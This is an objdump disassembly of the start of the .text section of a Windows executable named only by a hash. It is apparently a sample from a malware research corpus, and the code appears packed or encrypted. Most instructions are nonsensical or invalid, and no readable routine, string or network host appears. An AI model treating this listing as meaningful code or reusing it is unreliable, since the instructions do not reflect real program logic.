
886fba93f0c0cfef27ffeb28a5089775127c599badf52b5c32580f8795ec8390.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
